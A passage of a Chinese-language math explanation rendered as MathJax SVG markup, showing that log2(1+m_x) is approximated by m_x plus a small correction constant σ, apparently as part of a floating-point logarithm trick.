411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mo" transform="translate(11154.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span> 由于 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="10.633ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 4699.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mo" transform="translate(1643.2,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="mo" transform="translate(2588,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(2866,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(3366,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(3810.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(4310.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>，因此右侧的对数可以近似为： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="18.732ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 8279.5 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(278,0)"></path><path data-c="67" d="M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z" transform="translate(778,0)"></path></g><g data-mml-node="mn" transform="translate(1311,-241.4) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1714.6,0)"><path data-c="2061" d=""></path></g><g data-mml-node="mo" transform="translate(1714.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(2103.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2825.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(3826,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mo" transform="translate(5191.5,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5858.2,0)"><path data-c="2248" d="M55 319Q55 360 72 393T114 444T163 472T205 482Q207 482 213 482T223 483Q262 483 296 468T393 413L443 381Q502 346 553 346Q609 346 649 375T694 454Q694 465 698 474T708 483Q722 483 722 452Q722 386 675 338T555 289Q514 289 468 310T388 357T308 404T224 426Q164 426 125 393T83 318Q81 289 69 289Q55 289 55 319ZM55 85Q55 126 72 159T114 210T163 238T205 248Q207 248 213 248T223 249Q262 249 296 234T393 179L443 147Q502 112 553 112Q609 112 649 141T694 220Q694 249 708 249T722 217Q722 153 675 104T555 55Q514 55 468 76T388 123T308 170T224 192Q164 192 125 159T83 84Q80 55 69 55Q55 55 55 85Z"></path></g><g data-mml-node="msub" transform="translate(6914,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></g></svg></mjx-container></span>
这个近似在区间的两端是精确的，但为了考虑平均情况，我们需要用一个小常数
<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.292ex" height="1ex" role="img" focusable="false" viewBox="0 -431 571 442"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z"></path></g></g></g></svg></mjx-container></span> 来调整它，因此： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="41.203ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 18211.5 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(278,0)"></path><path data-c="67" d="M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z" transform="translate(778,0)"></path></g><g data-mml-node="mn" transform="translate(1311,-241.4) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1714.6,0)"><path data-c="2061" d=""></path></g><g data-mml-node="mi" transform="translate(1881.2,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(2731,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(3786.8,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mo" transform="translate(4962.5,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(5962.7,0)"><g data-mml-node="mi"><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(278,0)"></path><path data-c="67" d="M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z" transform="translate(778,0)"></path></g><g data-mml-node="mn" transform="translate(1311,-241.4) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(7677.2,0)"><path data-c="2061" d=""></path></g><g data-mml-node="mo" transform="translate(7677.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(8066.2,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(8788.5,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(9788.7,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mo" transform="translate(11154.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(11820.9,0)"><path data-c="2248" d="M55 319Q55 360 72 393T114 444T163 472T205 482Q207 482 213 482T223 483Q262 483 296 468T393 413L443 381Q502 346 553 346Q609 346 649 375T694 454Q694 465 698 474T708 483Q722 483 722 452Q722 386 675 338T555 289Q514 289 468 310T388 357T308 404T224 426Q164 426 125 393T83 318Q81 289 69 289Q55 289 55 319ZM55 85Q55 126 72 159T114 210T163 238T205 248Q207 248 213 248T223 249Q262 249 296 234T393 179L443 147Q502 112 553 112Q609 112 649 141T694 220Q694 249 708 249T722 217Q722 153 675 104T555 55Q514 55 468 76T388 123T308 170T224 192Q164 192 125 159T83 84Q80 55 69 55Q55 55 55 85Z"></path></g><g data-mml-node="msub" transform="translate(12876.7,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 